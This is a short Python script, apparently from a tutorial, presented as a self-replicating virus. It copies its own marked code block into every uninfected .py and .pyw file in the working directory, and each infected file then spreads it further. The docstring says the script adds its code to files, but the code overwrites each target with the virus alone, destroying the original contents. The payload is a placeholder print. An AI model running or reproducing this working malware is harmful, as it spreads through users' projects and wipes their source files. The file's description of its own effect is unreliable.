'''
This is an example of a self-replicating script that infects *.py and *.pyw 
files in the working directory and adds its code to the python files.
Every infected file will in turn infect any other python files that 
are not infected yet.
Part of the tutorial by NeuralNine
'''



### Virus ###
import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if line == '### Virus ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### End of virus ###\n':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
print(python_scripts)

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### Virus ###\n':
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')

        with open(script, 'w') as f:
            f.writelines(final_code)

# Payload (malicious code)
# Requires threading for best results
print('Hello World')

### End of virus ###